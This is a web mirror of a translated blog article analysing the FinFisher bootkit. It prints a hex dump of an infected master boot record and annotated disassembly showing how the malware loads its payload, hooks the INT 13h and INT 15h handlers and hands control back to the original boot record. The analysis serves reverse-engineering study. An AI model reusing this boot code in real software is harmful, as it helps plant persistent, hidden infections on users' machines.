<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>FinFisher Butkit Analysis</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Good evening! Exactly in a week, we start the course ‚ÄúReverse Engineering‚Äù , and today we want to share with you a translation of material that is dir...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>FinFisher Butkit Analysis</h1><div class="post__text post__text-html js-mediator-article">  Good evening!  Exactly in a week, we start the course <a href="https://otus.pw/gat0/">‚ÄúReverse Engineering‚Äù</a> , and today we want to share with you a translation of material that is directly related to this course.  Go. <br><br>  We recently <a href="http://www-03.ibm.com/security/%3Fce%3DISM0484%26ct%3DSWG%26cmp%3DIBMSocial%26cm%3Dh%26cr%3DSecurity%26ccy%3DUS">investigated the</a> malicious FinFisher bootkit published by <a href="https://securityintelligence.com/what-are-the-benefits-of-security-intelligence/">WikiLeaks</a> .  Most of the components of the Windows version were fairly simple, so let's go straight to the kernel-mode driver and boot code. <br><br><img src="https://habrastorage.org/webt/kg/jt/3o/kgjt3ozk7ugr29_-fpj84jwekmw.png">
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The kernel mode driver directly reads raw data from the hard disk, or writes it to it.  The simplified version of the method used by the driver can be found in <a href="http://www.codeproject.com/Articles/28314/Reading-and-Writing-to-Raw-Disk-Sectors">this article.</a> <br><a name="habracut"></a><br>  The malicious program creates a copy of the master boot record (master boot record, abbreviated as MBR) and saves it separately on the hard disk.  In addition, the program writes 0x2A00 bytes of data to an infected hard disk.  They are subsequently copied with malicious boot code.  The address of the first sector containing this data is stored in the boot code.  To find their physical location, the malware uses Logical Block Addressing (LBA). <br>  On the test machine, the MBR was overwritten with the following data: <br><br><pre><code class="bash hljs">f9fef780 fa 31 c0 8e c0 8e d8 8e d0 bc <span class="hljs-built_in"><span class="hljs-built_in">fc</span></span> ff fb 88 16 34 .1.............4 f9fef790 7c 68 00 00 68 37 7c cb 18 a7 3f 01 00 00 00 00 |h..h7|...?..... f9fef7a0 15 00 00 00 2e a7 3f 01 00 00 00 00 89 c0 89 c9 ......?......... f9fef7b0 89 d2 31 02 00 00 00 b4 41 bb aa 55 <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> 13 72 11 ..1.....A..U..r. f9fef7c0 81 fb 55 aa 75 0b f7 c1 01 00 74 05 c6 06 36 7c ..Uu....t...6| f9fef7d0 01 8a 16 34 7c b4 08 <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> 13 88 c8 24 3f a2 c2 7c ...4|......$?..| f9fef7e0 88 e8 88 cc c0 ec 06 40 a3 c3 7c 30 f6 fe c2 89 .......@..|0.... f9fef7f0 16 c5 7c 66 8b 0e 18 7c 66 8b 16 1c 7c b8 00 01 ..|f...|f...|... f9fef800 2d 20 00 8e c0 66 31 db 66 51 8c c0 05 20 00 8e - ...f1.fQ... .. f9fef810 c0 80 3e 36 7c 01 74 06 e8 62 00 e9 03 00 e8 36 ..&gt;6|.t..b.....6 f9fef820 00 66 59 66 81 c1 01 00 00 00 66 81 d2 00 00 00 .fYf......f..... f9fef830 00 66 ff 0e 20 7c 75 d0 8a 16 34 7c ea 00 10 00 .f.. |u...4|.... f9fef840 00 00 00 00 00 00 00 10 00 01 00 00 00 00 00 00 ................ f9fef850 00 00 00 00 00 00 00 8c c0 a3 <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> 7c 89 1e cb 7c ...........|...| f9fef860 66 89 0e cf 7c 66 89 16 d3 7c 66 52 66 31 d2 8a f...|f...|fRf1.. f9fef870 16 34 7c be c7 7c b4 42 <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> 13 66 5a c3 66 52 66 .4|..|.B..fZ.fRf f9fef880 53 66 89 c8 66 31 d2 66 31 db 8a 1e c2 7c 66 f7 Sf..f1.f1....|f. f9fef890 f3 66 42 88 16 c1 7c 66 31 d2 66 31 db 8b 1e c5 .fB...|f1.f1.... f9fef8a0 7c 66 f7 f3 8a 0e c1 7c 88 c5 88 d6 66 5b 8a 16 |f.....|....f[.. f9fef8b0 34 7c b8 01 02 <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> 13 66 5a c3 00 00 00 00 00 00 4|.....fZ....... f9fef8c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef8d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef8e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef8f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef900 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef910 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef920 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef930 00 00 00 00 00 00 00 00 65 f7 65 f7 00 00 80 01 ........ee.... f9fef940 01 00 07 fe ff ff 3f 00 00 00 d9 a6 3f 01 00 00 ......?.....?... f9fef950 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef960 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ f9fef970 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 aa ..............U.</code> </pre> <br><br>  A quick inspection of the data suggests that the malware changed the boot code, but the partition table information remained intact. <br><br>  <b>Malicious Boot Code Analysis</b> <br><br>  Let us consider in more detail the most interesting parts of the boot code.  First, it checks the installation of Extended Disk Drive (EDD): <br><br><pre> <code class="bash hljs">seg000:0037 B4 41 mov ah, 41h ; <span class="hljs-string"><span class="hljs-string">'A'</span></span> seg000:0039 BB AA 55 mov bx, 55AAh seg000:003C CD 13 int 13h</code> </pre> <br><br>  The malware sets a flag that indicates whether the EDD is set.  The flag controls the method used by the malware to read data from the hard disk to physical memory: <br><br><pre> <code class="bash hljs">seg000:004C C6 06 36 7C 01 mov byte ptr ds:if_edd_installed, 1 ;7C36h</code> </pre> <br><br>  Then, the malware gets the disk parameters: <br><br><pre> <code class="bash hljs">seg000:0051 8A 16 34 7C mov dl, ds:7C34h ;drive number, first drive is 0x80 seg000:0055 B4 08 mov ah, 8 seg000:0057 CD 13 int 13h</code> </pre><br><br>  At the moment, the program has collected enough information to copy a malicious 0x2A00 byte blob from the hard disk into physical memory.  Data blocks are copied by sector at a time.  The code below is the cycle used by the malware to copy the code: <br><br><pre> <code class="bash hljs">seg000:0091 80 3E 36 7C 01 cmp byte ptr ds:if_edd_installed, 1 seg000:0096 74 06 jz short loc_9E seg000:0098 E8 62 00 call read_data_method_no_edd_installed seg000:009B E9 03 00 jmp loc_A1 seg000:009E ; --------------------------------------------------------------------------- seg000:009E seg000:009E loc_9E: seg000:009E E8 36 00 call read_data_method_edd_installed seg000:00A1 seg000:00A1 loc_A1: seg000:00A1 66 59 pop ecx seg000:00A3 66 81 C1 01 00 00 00 add ecx, 1 seg000:00AA 66 81 D2 00 00 00 00 adc edx, 0 seg000:00B1 66 FF 0E 20 7C dec dword ptr ds:7C20h ;0x0015 seg000:00B6 75 D0 jnz short loc_88</code> </pre> <br><br>  Below is the function code that is used to copy data when installing an EDD: <br><br><pre> <code class="bash hljs">BOOT_SECTOR:7CD7 8C C0 mov ax, es BOOT_SECTOR:7CD9 A3 CD 7C mov word_7CCD, ax BOOT_SECTOR:7CDC 89 1E CB 7C mov word_7CCB, bx BOOT_SECTOR:7CE0 66 89 0E CF 7C mov dword_7CCF, ecx BOOT_SECTOR:7CE5 66 89 16 D3 7C mov dword_7CD3, edx BOOT_SECTOR:7CEA 66 52 push edx BOOT_SECTOR:7CEC 66 31 D2 xor edx, edx BOOT_SECTOR:7CEF 8A 16 34 7C mov dl, byte_7C34 BOOT_SECTOR:7CF3 BE C7 7C mov si, 7CC7h BOOT_SECTOR:7CF6 B4 42 mov ah, 42h ; <span class="hljs-string"><span class="hljs-string">'B'</span></span> BOOT_SECTOR:7CF8 CD 13 int 13h ; DISK - IBM/MS Extension - EXTENDED READ (DL - drive, DS:SI - disk address packet)</code> </pre> <br><br>  In this example, before calling INT 13h to copy the first sector of malicious data into the physical memory of the test machine, we have the following arguments: <br><br><pre> <code class="bash hljs"> 0x0000000000007cc7 &lt;bogus+ 0&gt;: 0x0010 0x0001 0x0000 0x0100 0xa718 0x013f 0x0000 0x0000 +0: 0x10 - packet size +2: 0x1 - number of sectors +4: 0x0000 - offset +6: 0x1000 - segment +8: 0x013fa718 - LBA</code> </pre> <br><br>  After the malware finishes copying the data, it goes to the copied code and continues execution there: <br><br><pre> <code class="bash hljs">seg000:00B8 8A 16 34 7C mov dl, ds:7C34h ;0x0000 seg000:00BC EA 00 10 00 00 jmp far ptr 0:1000h</code> </pre><br><br>  The 0x1000 code is the most interesting part of the program.  But before continuing the analysis, it is worth recalling the FinFisher bootkit works in real mode.  This is different from protected mode.  One of the differences is that you have to calculate physical addresses using a combination of the es: di and ds: si registers. <br>  The formula for calculating the physical address is (segment * 0x10) + offset.  For example, if we look at the es: di pair, then es is the segment, and di is the offset.  All addresses below are calculated using this formula. <br>  Now look at the most interesting part of the code.  First, the malware calculates the address of the segment from which data is being copied (this is the second time the data blob is copied): <br><br><pre> <code class="bash hljs">seg000:0024 88 16 1B 00 mov ds:1Bh, dl seg000:0028 BE 13 04 mov si, 413h seg000:002B 26 8B 04 mov ax, es:[si] seg000:002E 66 0F B7 C0 movzx eax, ax seg000:0032 66 C1 E0 0A shl eax, 0Ah seg000:0036 66 2D C2 28 00 00 sub eax, 28C2h ;before the segment address is stored: ;&lt;bochs:148&gt; x /1hw 0x101c ;[bochs]:0x000000000000101c &lt;bogus+ 0&gt;: 0x00000000 seg000:003C 66 A3 1C 00 mov ds:1Ch, eax ;ds = 0x0100, ds:1ch = hex((0x0100* 0x10) + 0x1c) = 0x101c ;after the segment address is stored: ;&lt;bochs:150&gt; x /1hw 0x101c ;[bochs]:0x000000000000101c &lt;bogus+ 0&gt;: 0x0009d33e</code> </pre> <br><br>  Then, the program installs hooks for the INT 13h and INT 15h handlers.  As you can see from the above code, the malware does not provide new ideas on how to intercept low-level interrupt handlers: <br><br><pre> <code class="bash hljs">seg000:0040 66 50 push eax seg000:0042 66 C1 E8 0A shr eax, 0Ah seg000:0046 26 89 04 mov es:[si], ax ;es=0x0000, si = 0x0413 ;before: &lt;bochs:156&gt; x /1hw 0x413 [bochs]: 0x0000000000000413 &lt;bogus+ 0&gt;: 0x0000027f ;after: ;&lt;bochs:158&gt; x /1hw 0x413 [bochs]: 0x0000000000000413 &lt;bogus+ 0&gt;: 0x00000274 seg000:0049 66 58 pop eax seg000:004B seg000:004B loc_4B: seg000:004B seg000:004B 66 C1 E8 04 shr eax, 4 seg000:004F A3 22 00 mov ds:22h, ax ;ax = 0x9d33 ;after: ;&lt;bochs:167&gt; x /1hh 0x1022 [bochs]: 0x0000000000001022 &lt;bogus+ 0&gt;: 0x9d33 seg000:0052 FA cli seg000:0053 loc_53: seg000:0053 8C D8 mov ax, ds seg000:0055 8E C0 mov es, ax seg000:0057 66 B8 20 E8 00 00 mov eax, 0E820h ;get system memory map seg000:005D 66 BA 50 41 4D 53 mov edx, 534D4150h ;<span class="hljs-string"><span class="hljs-string">"SMAP"</span></span> seg000:0063 66 31 DB xor ebx, ebx ;start at the beginning of the map. seg000:0066 66 31 FF xor edi, edi seg000:0069 BF 26 01 mov di, 126h ;es:di buffer that gets the result. ;es = 0x100, di = 0x0126 seg000:006C 26 66 C7 45 14 01 00 00+ mov dword ptr es:[di+14h], 1 seg000:0075 66 B9 18 00 00 00 mov ecx, 18h ;size of the buffer. seg000:007B CD 15 int 15h ;BIOS Memory Services seg000:007D 72 34 jb short loc_B3 seg000:007F 66 3D 50 41 4D 53 cmp eax, 534D4150h ;check <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-string"><span class="hljs-string">"SMAP"</span></span> seg000:0085 75 2C jnz short loc_B3 seg000:0087 66 85 DB <span class="hljs-built_in"><span class="hljs-built_in">test</span></span> ebx, ebx seg000:008A 74 27 jz short loc_B3 seg000:008C db 3Eh seg000:008C 3E 66 89 1E F2 02 mov ds:2F2h, ebx ;holds continuation value ;ds = 0x100, physical address 0x12f2 seg000:0092 66 31 C0 xor eax, eax seg000:0095 8E C0 mov es, ax seg000:0097 assume es:nothing seg000:0097 26 66 A1 54 00 mov eax, dword ptr es:int_15_h ;IVTABLE:0054 seg000:009C db 3Eh ;debug001:12EE 00 00 00 00 dword_12EE dd 0 ;debug001:12F2 01 00 00 00 dword_12F2 dd 1 seg000:009C 3E 66 A3 EE 02 mov ds:2EEh, eax ;debug001:12EE 59 F8 00 F0 dword_12EE dd 0F000F859h ;debug001:12F2 01 00 00 00 dword_12F2 dd 1 seg000:00A1 A1 22 00 mov ax, ds:22h ;segment_hook ;previously calculated value 0x9d33 seg000:00A4 66 C1 E0 10 shl eax, 10h seg000:00A8 66 05 42 01 00 00 add eax, 142h ;before hook is installed: IVTABLE:004C FE E3 00 F0 dword_4C dd 0F000E3FEh IVTABLE:004C IVTABLE:0050 39 E7 word_50 dw 0E739h IVTABLE:0052 00 F0 word_52 dw 0F000h IVTABLE:0054 59 F8 00 F0 dword_54 dd 0F000F859h IVTABLE:0054 seg000:00AE 26 66 A3 54 00 mov dword ptr es:int_15_h, eax ;hooks INT15h ;&lt;bochs:206&gt; x /1hw 0x54 [bochs]: 0x0000000000000054 &lt;bogus+ 0&gt;: 0x9d330142 ;IVTABLE:0054 42 01 word_54 dw 142h ;offset ;IVTABLE:0056 33 9D dw 9D33h ;segment seg000:00B3 loc_B3: seg000:00B3 66 31 C0 xor eax, eax seg000:00B6 8E C0 mov es, ax seg000:00B8 26 66 A1 4C 00 mov eax, dword ptr es:int_13_h ;before: ;debug001:11D4 00 00 00 00 int_13_original dd 0 ;after: ;debug001:11D4 FE E3 00 F0 int_13_original dd 0F000E3FEh seg000:00BD db 3Eh seg000:00BD 3E 66 A3 D4 01 mov ds:1D4h, eax ;debug001:11CC FE E3 00 F0 int_13_original_1 dd 0F000E3FEh seg000:00C2 3E 66 A3 CC 01 mov ds:1CCh, eax seg000:00C7 A1 22 00 mov ax, ds:22h ;0x9d33 seg000:00CA 66 C1 E0 10 shl eax, 10h seg000:00CE db 3Eh seg000:00CE 3E 66 A3 51 02 mov ds:251h, eax ;before: ;debug001:1251 00 00 00 00 hook_segment dd 0 ;after: ;debug001:1251 00 00 33 9D hook_segment dd 9D330000h seg000:00D3 66 05 12 01 00 00 add eax, 112h seg000:00D9 26 66 A3 4C 00 mov dword ptr es:loc_4B+1, eax ;hooks INT13h ;es = 0x00 eax = 0x112 ;IVT after both INT 13h and INT 15h hooks are installed: IVTABLE:004C 12 01 int_13_h dw 112h ; offset IVTABLE:004E 33 9D dw 9D33h ; segment IVTABLE:0050 39 E7 word_50 dw 0E739h IVTABLE:0052 00 F0 word_52 dw 0F000h IVTABLE:0054 42 01 int_15_h dw 142h ; offset IVTABLE:0056 33 9D dw 9D33h ; segment</code> </pre> <br><br>  Now hooks are set for INT 13h and INT 15h, but the code for functions that hook INT is not yet copied to the computed segment.  Obviously, the next step is to copy the code for the intercepted handlers: <br><br><pre> <code class="bash hljs">seg000:00DE A1 22 00 mov ax, ds:22h seg000:00E1 8E C0 mov es, ax seg000:00E3 31 FF xor di, di seg000:00E5 B9 C2 28 mov cx, 28C2h seg000:00E8 FC cld seg000:00E9 BE 3E 01 mov si, 13Eh seg000:00EC F3 A4 rep movsb ;si = 0x013e - <span class="hljs-built_in"><span class="hljs-built_in">source</span></span> of the data to be copied. ;di = 0x0000 - destination ;cx = 0x28c2 - number of bytes to be copied. ;ds = 0x0100, es = 0x9d33 ;the actual physical addresses of the <span class="hljs-built_in"><span class="hljs-built_in">source</span></span> is ds:[si] = ;hex((0x0100 * 0x10) + 0x13e) = 0x113e ;the physical address of the destination is es:[di] = ;hex((0x9dd3 * 0x10) + 0x0000) = 0x9dd30 ;copies all the data copied <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> the first stage except <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> the first 0x13e bytes. ;hex(0x2a00-0x28c2) = 0x13e</code> </pre> <br><br>  Now the malware is ready to regain control of the original MBR, but first, it needs to restore the MBR to 0x7C00 (the sector in which the copy of the original MBR is located is stored elsewhere on the hard disk), and then transfer the execution of the original MBR. <br><br><pre> <code class="bash hljs">seg000:00EE FB sti seg000:00EF 66 8B 0E 13 00 mov ecx, ds:13h seg000:00F4 66 8B 16 17 00 mov edx, ds:17h seg000:00F9 66 89 0E 1E 01 mov ds:11Eh, ecx seg000:00FE 66 89 16 22 01 mov ds:122h, edx seg000:0103 BE 16 01 mov si, 116h ;buffer ;ds = 0x0100, address 0x1116 seg000:0106 BB AA 55 mov bx, 55AAh seg000:0109 8A 16 1B 00 mov dl, ds:1Bh ;drive number here 0x80 seg000:010D B4 42 mov ah, 42h ; <span class="hljs-string"><span class="hljs-string">'B'</span></span> seg000:010F CD 13 int 13h ;DISK - IBM/MS Extension - EXTENDED READ (DL - drive, DS:SI - disk address packet) ;INT 13h is hooked now ;debug003:0112 EA 00 00 33 9D jmp far ptr loc_9D330 ;&lt;bochs:267&gt; x /10hh 0x1116 [bochs]: 0x0000000000001116 &lt;bogus+ 0&gt;: 0x0010 0x0001 0x7c00 0x0000 0xa72d 0x013f 0x 0000 0x0000 0x0000000000001126 &lt;bogus+ 16&gt;: 0x0000 0x0000 size of the packet 0x0010 number of blocks to transfer = 0x0001 destination 0x7c00 LBA: 0x013fa7d2 ;Jumps to the original MBR here: seg000:0111 EA 00 7C 00 00 jmp far ptr 0:7C00h</code> </pre> <br><br>  <b>What we learned from FinFisher bootkit</b> <br><br>  This FinFisher bootkit example does not offer new techniques or improvements over other bootkits.  Malware creators have decided to install hooks for INT 13h and INT 15h handlers before the code for these handlers is copied into memory;  which can be disastrous.  For example, if the code of intercepted handler functions cannot be copied, a system crash may occur. <br><br>  Traditionally, we are waiting for your comments and invite everyone to <a href="https://otus.pw/htWj/">the open day</a> , which will be held tomorrow. </div><p>Source: <a href="https://habr.com/ru/post/441970/">https://habr.com/ru/post/441970/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../441942/index.html">Breaking is not building. Or devolution</a></li>
<li><a href="../441944/index.html">Why we chose the Lexus RX450h</a></li>
<li><a href="../441946/index.html">REST API on Laravel in 100 lines of code</a></li>
<li><a href="../441952/index.html">Choosing a file storage system for team work.</a></li>
<li><a href="../441954/index.html">User reward to authors Habra</a></li>
<li><a href="../441972/index.html">Invidious - alternative YouTube frontend</a></li>
<li><a href="../441974/index.html">The path of the historian from HR to Java programmers: a little luck and perseverance</a></li>
<li><a href="../441976/index.html">With you Phys.tech.Science: we look for hidden parameters and plunge into the wondrous quantum world</a></li>
<li><a href="../441980/index.html">Scientists have identified the drawbacks of the Windows Update interface, which is partially designed for "stupid users"</a></li>
<li><a href="../441986/index.html">freetype 2 and opengl write text</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>